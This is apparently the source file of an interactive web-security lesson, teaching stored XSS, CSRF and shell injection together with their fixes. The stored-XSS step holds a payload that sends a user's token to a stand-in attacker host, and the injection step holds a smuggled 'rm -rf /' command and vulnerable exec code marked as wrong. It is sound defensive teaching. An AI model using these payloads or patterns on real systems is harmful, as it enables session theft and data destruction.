import { actor, box, browser, db, defineLesson, flow, link, patch } from '@/content/dsl';
import type { LinkSpec, NodeSpec, ScreenLine } from '@/engine/types';

/* ---------- layout: the victim’s browser · your server and DB · the attacker’s side on the right ---------- */
const safeList: ScreenLine[] = [{ t: 'h', text: 'Shared list' }, { t: 'item', text: 'Buy milk' }, { t: 'item', text: '<img src=x onerror=…>' }];
const pwnedList: ScreenLine[] = [{ t: 'h', text: 'Shared list' }, { t: 'item', text: 'Buy milk' }, { t: 'error', text: '(script ran silently)' }];
const victim = browser(130, 300, { w: 220, h: 180, url: 'todo-app.com', screen: safeList });
const server = box(470, 300, 'todo-app.com', { sub: 'Express', icon: 'server', tone: 'server', w: 200 });
const mongo = db(470, 500, 'MongoDB', { w: 140, h: 100 });
const attacker = actor(850, 140, 'Attacker', { icon: 'bug', tone: 'danger' });
const evil = box(850, 460, 'evil.example', { sub: 'attacker’s site', icon: 'globe', tone: 'danger', w: 200 });

const base: Record<string, NodeSpec> = { victim, server, mongo };
const links: LinkSpec[] = [link('victim', 'server'), link('server', 'mongo')];

export default defineLesson({
  metrics: [
    { id: 'attack', label: 'Attack' },
    { id: 'works', label: 'Works?' },
  ],
  legend: { err: 'malicious', auth: 'cookie / token' },
  goals: [
    { text: 'How stored XSS steals sessions', step: 2 },
    { text: 'Why React mostly protects you — and where it doesn’t', step: 3 },
    { text: 'CSRF and SameSite cookies', step: 4 },
    { text: 'Injection beyond the database', step: 6 },
    { text: 'Everyday security hygiene', step: 7 },
  ],
  steps: [
    {
      short: 'Three attacks',
      beat: 'setup',
      title: 'Three ways attackers abuse a web app',
      body: [
        '**XSS**: get their JavaScript to run in other users’ browsers. **CSRF**: make a victim’s browser send a request to your site with their cookies. **Injection**: smuggle code or query syntax into something your server runs.',
        'Each exploits trust in the wrong place. Let’s see each one, and the defaults that shut it down.',
      ],
      metrics: { attack: '—', works: '—' },
      scene: { nodes: { ...base, attacker, evil }, links: [...links, link('attacker', 'server', { style: 'dashed', tone: 'danger' }), link('evil', 'victim', { style: 'dashed', tone: 'danger' })] },
    },
    {
      short: 'Stored XSS',
      beat: 'problem',
      title: 'Stored XSS: a todo that runs code',
      body: [
        'The attacker adds a todo to a shared list whose text is HTML: `<img src=x onerror="fetch(\'//evil.example/?t=\'+localStorage.token)">`. The server stores it like any text.',
        'Your app renders todo text with `dangerouslySetInnerHTML` (or `innerHTML`). When Ben opens the list, the browser treats it as HTML, the `onerror` script runs **as your site**, and Ben’s token is sent to the attacker. That’s [[xss|XSS]].',
      ],
      code: { file: 'TodoItem.jsx', lang: 'jsx', code: `<li dangerouslySetInnerHTML={{ __html: todo.text }} />   // ❌ runs any HTML/JS in the text`, err: [1] },
      metrics: { attack: 'stored XSS', works: 'yes' },
      scene: {
        nodes: { ...patch(base, { victim: { screen: pwnedList, state: 'error' } }), attacker, evil: { ...evil, state: 'active', badge: { text: 'receives tokens', tone: 'danger' } } },
        links: [...links, link('attacker', 'server', { tone: 'danger' }), link('victim', 'evil', { tone: 'danger', style: 'dashed' })],
        flows: [
          flow(['attacker', 'server', 'mongo'], { kind: 'err', label: ['todo: <img onerror=…>', 'saved'], every: 6.4 }),
          flow(['server', 'victim'], { kind: 'res', label: 'list incl. payload', every: 6.4, offset: 2.4 }),
          flow(['victim', 'evil'], { kind: 'auth', label: 'token → attacker', every: 6.4, offset: 4.2 }),
        ],
      },
    },
    {
      short: 'Escape it',
      beat: 'solution',
      title: 'Render text as text',
      body: [
        'React **escapes** everything you put in `{curly braces}`: `<img …>` is shown as those characters, never parsed as HTML. Plain `{todo.text}` is safe. The danger is the escape hatch — `dangerouslySetInnerHTML` — and links with `javascript:` URLs.',
        'If you truly need user HTML (rich text), [[sanitize]] it with a library like DOMPurify. Add a [[csp|Content-Security-Policy]] header to block inline scripts, and keep tokens in `httpOnly` cookies so scripts can’t read them anyway.',
      ],
      check: {
        q: 'A todo’s text is `<img src=x onerror=alert(1)>`. You render `<li>{todo.text}</li>` in React. What happens?',
        options: ['An alert pops up', 'The text is shown literally; nothing runs', 'React throws an error', 'The image is shown'],
        answer: 1,
        explain: 'React escapes strings inside JSX, so the browser sees text, not markup. XSS in React apps almost always comes from `dangerouslySetInnerHTML`, raw DOM APIs or `javascript:` links.',
      },
      code: {
        file: 'TodoItem.jsx',
        lang: 'jsx',
        code: `<li>{todo.text}</li>                                        // ✅ escaped by React
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} /> // only if you must`,
        hl: [1],
      },
      metrics: { attack: 'stored XSS', works: 'no' },
      scene: {
        nodes: { ...patch(base, { victim: { state: 'ok' } }), attacker, evil: { ...evil, state: 'dim' } },
        links: [...links, link('attacker', 'server', { tone: 'danger' })],
        flows: [
          flow(['attacker', 'server', 'mongo'], { kind: 'err', label: ['<img onerror=…>', 'saved (as text)'], every: 5 }),
          flow(['server', 'victim'], { kind: 'res', label: 'shown as plain text', every: 5, offset: 2.4 }),
        ],
      },
    },
    {
      short: 'CSRF',
      beat: 'problem',
      title: 'CSRF: requests your user never meant to send',
      body: [
        'Ben, logged in to your app, visits `evil.example`. Its page auto-submits a hidden form to `todo-app.com/api/todos/delete-all`. The browser attaches Ben’s session cookie — it always does for your domain — and the server sees a valid, logged-in request.',
        'That’s [[csrf|CSRF]]: the attacker can’t read the response, but they don’t need to — the damage is the request.',
      ],
      metrics: { attack: 'CSRF', works: 'yes' },
      scene: {
        nodes: { ...patch(base, { victim: { url: 'evil.example', screen: [{ t: 'h', text: 'Free prize!' }, { t: 'btn', text: 'Claim' }], state: 'error' } }), evil: { ...evil, state: 'active' } },
        links: [...links, link('evil', 'victim', { tone: 'danger', style: 'dashed', label: 'hidden form' })],
        flows: [
          flow(['evil', 'victim'], { kind: 'err', label: 'auto-submit', every: 5 }),
          flow(['victim', 'server', 'mongo'], { kind: 'auth', label: ['POST + Ben’s cookie', 'deleteMany'], every: 5, offset: 1.6 }),
        ],
      },
    },
    {
      short: 'SameSite',
      beat: 'solution',
      title: 'SameSite cookies and Origin checks',
      body: [
        'Mark session cookies `SameSite=Lax` (or `Strict`): browsers then leave them off cross-site `POST`s, so the forged request arrives logged out. It’s the default in modern browsers, but set it explicitly.',
        'Belt and braces: never change data on `GET`, check the `Origin` header on state-changing requests, and use CSRF tokens if you must allow cross-site cookies.',
      ],
      code: { file: 'server.js', lang: 'js', code: `res.cookie('sid', id, { httpOnly: true, secure: true, sameSite: 'lax' });`, hl: [1] },
      metrics: { attack: 'CSRF', works: 'no' },
      scene: {
        nodes: { ...patch(base, { victim: { url: 'evil.example', screen: [{ t: 'h', text: 'Free prize!' }, { t: 'btn', text: 'Claim' }] }, server: { state: 'ok', badge: { text: 'no cookie → 401', tone: 'ok' } } }), evil },
        links: [...links, link('evil', 'victim', { tone: 'danger', style: 'dashed' })],
        flows: [flow(['evil', 'victim'], { kind: 'err', label: 'auto-submit', every: 5 }), flow(['victim', 'server'], { kind: 'err', label: 'POST (cookie withheld)', back: 'err', backLabel: '401', every: 5, offset: 1.6 })],
      },
    },
    {
      short: 'Injection',
      beat: 'problem',
      title: 'Injection: when input becomes code',
      body: [
        'You’ve met [[nosql-injection|NoSQL injection]]: an object like `{ "$ne": null }` sneaking into a filter. The same mistake exists anywhere input is glued into something executable — a shell command, a regex, an HTML template.',
        'Here a “convert this file” feature passes a filename to the shell. `photo.jpg; rm -rf /` runs two commands.',
      ],
      code: {
        file: 'routes/convert.js',
        lang: 'js',
        code: `exec(\`convert uploads/\${req.body.name} out.png\`);          // ❌ shell sees "; rm -rf /"
execFile('convert', [\`uploads/\${safeName}\`, 'out.png']);   // ✅ arguments, no shell`,
        err: [1],
        hl: [2],
      },
      metrics: { attack: 'injection', works: 'yes' },
      scene: {
        nodes: { ...patch(base, { server: { state: 'error', badge: { text: 'runs attacker’s command', tone: 'danger' } } }), attacker },
        links: [...links, link('attacker', 'server', { tone: 'danger' })],
        flows: [flow(['attacker', 'server'], { kind: 'err', label: 'name: "x.jpg; rm -rf /"', every: 4 })],
      },
    },
    {
      short: 'Hygiene',
      beat: 'technique',
      title: 'The boring habits that stop most attacks',
      body: [
        'Validate every input’s type and shape (zod), and pass data as **parameters**, never by building code strings. Add security headers with `helmet()` (CSP, no sniffing, frame protection).',
        'Rate-limit login and expensive endpoints, keep dependencies updated (`npm audit`), log suspicious activity, and give each secret least privilege. None of it is exciting; all of it works.',
      ],
      code: {
        file: 'server.js',
        lang: 'js',
        code: `app.use(helmet());                               // security headers incl. CSP
app.use('/api/login', rateLimit({ windowMs: 15 * 60_000, limit: 10 }));
app.use(express.json({ limit: '100kb' }));        // no giant bodies`,
        hl: [1, 2, 3],
      },
      metrics: { attack: 'all three', works: 'mostly not' },
      scene: { nodes: { ...patch(base, { server: { state: 'ok', badge: { text: 'helmet · limits · validation', tone: 'ok' } } }), attacker, evil }, links: [...links, link('attacker', 'server', { tone: 'danger' }), link('evil', 'victim', { tone: 'danger', style: 'dashed' })] },
    },
    {
      short: 'Recap',
      beat: 'recap',
      title: 'Three attacks, three defaults',
      body: [
        '{danger:XSS}: render user content as text (React does), sanitize if you must render HTML, add CSP, keep tokens in httpOnly cookies.',
        '{danger:CSRF}: `SameSite` cookies, no state changes on GET, check `Origin`.',
        '{danger:Injection}: validate types, pass data as parameters, never build queries or commands from strings. Plus headers, rate limits and updated dependencies.',
      ],
      metrics: { attack: 'all three', works: 'no' },
      scene: { nodes: { ...patch(base, { server: { state: 'ok' }, victim: { state: 'ok' } }), attacker, evil }, links },
    },
  ],
});
